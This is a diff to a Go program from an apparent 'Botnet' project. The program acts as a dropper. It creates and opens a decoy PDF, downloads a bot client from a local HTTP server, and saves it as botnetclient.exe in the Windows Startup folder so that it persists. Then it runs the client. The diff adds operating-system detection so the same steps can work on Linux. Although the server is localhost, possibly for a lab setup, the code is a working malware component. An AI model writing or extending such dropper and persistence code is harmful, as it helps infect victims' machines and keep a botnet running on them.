@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"github.com/jung-kurt/gofpdf"
 	"io"
 	"log"
@@ -8,17 +9,26 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"time"
 )
 
-var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
-var pdfName = filepath.Join(srcDir, "/files/hello.pdf")
+//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+//var pdfName = "hello.pdf"
 
 //var clientName = filepath.Join(srcDir, "/files/downloadedclient.exe")
 
-var home, err = os.UserHomeDir()
+var home, _ = os.UserHomeDir()
 
-var clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")
+var here, _ = os.Getwd()
+
+var opersys = runtime.GOOS
+
+var pdfName = filepath.Join(here, "\\hello.pdf")
+
+var clientName string
+
+//var
 
 func createpdf() {
 	//create pdf
@@ -50,7 +60,7 @@ func getclient() {
 	defer out.Close()
 
 	// Get the data
-	resp, err := http.Get("http://127.0.0.1:8081/client")
+	resp, err := http.Get("http://localhost:8081/client")
 	if err != nil {
 		log.Fatalf("An Error Occured %v", err)
 	}
@@ -76,6 +86,19 @@ func runclient() {
 }
 
 func main() {
+
+	switch opersys {
+	case "windows":
+		clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")
+	case "linux":
+		//fmt.Println("linux not supported YET")
+		//os.Exit(1)
+		clientName = filepath.Join(here, "\\botnetclient.exe")
+	case "default":
+		fmt.Println("OS will not be supported")
+		os.Exit(1)
+	}
+
 	createpdf()
 
 	openpdf()
